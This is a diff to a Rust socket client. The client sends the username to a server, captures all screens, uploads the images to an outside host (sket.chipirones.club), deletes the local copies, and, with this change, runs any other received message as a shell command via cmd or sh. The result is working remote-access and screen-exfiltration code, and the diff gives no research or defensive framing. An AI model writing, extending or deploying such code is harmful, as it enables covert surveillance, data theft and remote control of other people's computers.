@@ -1,4 +1,5 @@
 use std::{fs, thread, time};
+use std::process::Command;
 use tokio::fs::File;
 use tokio_util::codec::{BytesCodec, FramedRead};
 use std::time::Instant;
@@ -16,15 +17,15 @@ fn main() {
         .connect()
         .expect("Connection failed");
 
-    thread::sleep(time::Duration::from_millis(1000));
-
     loop {
         thread::sleep(time::Duration::from_millis(1000));
     }
 }
 
 fn join_callback(_payload: Payload, socket: RawClient) {
-    socket.emit("comm", json!({"name": whoami::username()})).expect("Server unreachable");
+    let user: String = whoami::username();
+    println!("Emitting communication name as {}", &user);
+    socket.emit("comm", json!({"name": &user})).expect("Server unreachable");
 }
 
 fn callback(payload: Payload, _socket: RawClient) {
@@ -41,15 +42,16 @@ fn callback(payload: Payload, _socket: RawClient) {
                     let screens = screenshots::Screen::all().unwrap();
 
                     for screen in screens {
-                        println!("SCREEN");
+                        println!("Scanning screen {} with res: {}x{}", screen.display_info.id, screen.display_info.width, screen.display_info.height);
                         let image = screen.capture().unwrap();
                         let buffer = image.buffer();
 
                         let path: String = format!("{}.png", screen.display_info.id);
 
+                        println!("Writing file {}", &path);
                         fs::write(&path, &buffer).expect("Error writing file");
 
-                        println!("Wrote file");
+                        println!("Wrote file {}", &path);
 
                         let rt = tokio::runtime::Runtime::new().unwrap();
 
@@ -57,13 +59,29 @@ fn callback(payload: Payload, _socket: RawClient) {
                             rq_post(&path).await.expect("Did not work");
                         });
 
-                        println!("Eliminando archivo");
+                        println!("Waiting extra for post to complete (2 secs)");
+                        thread::sleep(time::Duration::from_secs(2));
+                        println!("Deleting file {}", &path);
                         fs::remove_file(&path).expect("Error removing file");
-                        println!("Eliminado archivo");
+                        println!("Deleted {}", &path);
                     }
                 }
                 _ => {
-                    println!("Received: {}", str)
+                    println!("Received: {}, trying to execute it as a command", &str);
+                    let output = if cfg!(target_os = "windows") {
+                        Command::new("cmd")
+                            .args(["/C", &str])
+                            .output()
+                            .expect("failed to execute process")
+                    } else {
+                        Command::new("sh")
+                            .arg("-c")
+                            .arg(&str)
+                            .output()
+                            .expect("failed to execute process")
+                    };
+
+                    println!("{}", String::from_utf8_lossy(&output.stdout));
                 }
             }
         }
@@ -72,7 +90,7 @@ fn callback(payload: Payload, _socket: RawClient) {
 }
 
 async fn rq_post(file_name: &String) -> anyhow::Result<String> {
-    println!("Sending file");
+    println!("Sending file {}", file_name);
     let client = Client::new();
     let file = File::open(file_name).await?;
 
@@ -85,9 +103,9 @@ async fn rq_post(file_name: &String) -> anyhow::Result<String> {
     let form = multipart::Form::new()
         .part("ss", sf);
 
-    println!("Posting file");
+    println!("Posting file {}", file_name);
     let response = client.post("http://sket.chipirones.club/image").multipart(form).send().await?;
-    println!("Posted file");
+    println!("Posted file {}", file_name);
     let result = response.text().await?;
 
     Ok(result)
